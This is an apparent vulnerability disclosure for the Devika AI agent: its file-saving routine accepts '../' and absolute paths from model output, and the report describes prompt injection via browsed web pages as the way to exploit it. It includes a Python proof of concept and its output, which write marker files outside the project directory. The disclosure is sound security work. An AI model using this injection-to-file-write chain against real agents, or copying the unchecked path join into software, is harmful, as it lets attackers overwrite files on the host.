# Devika: Coder file-write paths escape the project directory (../ and absolute paths)

## Description

`Coder.save_code_to_project` (src/agents/coder/coder.py:68-80) joins the LLM-parsed `file` field directly into `os.path.join(self.project_dir, project_name, file['file'])` with no containment validation: both `../` segments and POSIX absolute paths survive and write outside the project directory.

## Impact

While the agent browses web pages or processes tasks, page content can steer the model's output through prompt injection to carry a malicious `file` field, making the Devika server write files at any writable path with its own privileges (overwriting configuration, dropping files into scheduler locations, etc.). The attacker-controlled input is the untrusted web content the agent processes; the violated boundary is the project directory.

## PoC

```bash
cd <devika source directory>
python - << 'PYEOF'
import os, sys
sys.path.insert(0, ".")
from src.agents.coder.coder import Coder

c = Coder("repro")
# model output steered to carry a ../ file field (normal output is a bare filename)
c.save_code_to_project(
    [{"file": "../poc-escaped/PWNED_CW.txt", "code": "written outside"}], "repo")
# absolute paths survive as well
c.save_code_to_project(
    [{"file": "/tmp/devika_cw_absolute.txt", "code": "absolute escape"}], "repro")

print("relative escape:", os.path.exists("data/projects/poc-escaped/PWNED_CW.txt"))
print("absolute escape:", os.path.exists("/tmp/devika_cw_absolute.txt"))
PYEOF
```

## Execution result

```
relative escape (data/projects/poc-escaped/PWNED_CW.txt): True
absolute escape (/tmp/devika_cw_absolute.txt): True

$ ls -la data/projects/poc-escaped/
-rw-r--r-- 1 iot iot 15 Sep 15 09:54 PWNED_CW.txt
```
